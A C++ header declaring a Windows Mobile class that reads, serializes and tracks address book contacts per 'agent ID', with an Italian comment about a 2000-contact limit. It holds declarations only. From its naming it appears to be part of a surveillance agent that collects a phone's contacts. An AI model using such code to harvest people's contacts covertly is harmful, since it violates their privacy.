
#include <windows.h>
#define REQ_COUNT 2000 //se un utente ha piu' di 2000 contatti gli altri vengono persi

class CPoomAddressbook
{
	private:
		static CPoomAddressbook* m_pInstance;
		static volatile LONG lLock;
				
		UINT requestedCount;
		UINT handleCount;
		DWORD ptrArray[REQ_COUNT];
		CONTACT **contacts;
		BOOL m_bIsValid;

		std::map<UINT, identifyContact> addressbookMapSha1;

		void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact);
		void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact);
		DWORD _SerializedStringLength(LPCWSTR lpString);
		DWORD _Prefix(DWORD dwLength, int entryType);
		void _SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType);
		UINT LoadMarkup(UINT uAgentId);
		void SaveMarkup(UINT,BYTE *,UINT);
		UINT SerilaizeContact(UINT i, LPBYTE *lpOutBuf,CONTACTACC* contact);

	public:
		CPoomAddressbook();
		~CPoomAddressbook();
		void Run(UINT uAgentId);
		static CPoomAddressbook* self();
		BOOL IsValid(){ return m_bIsValid; }
};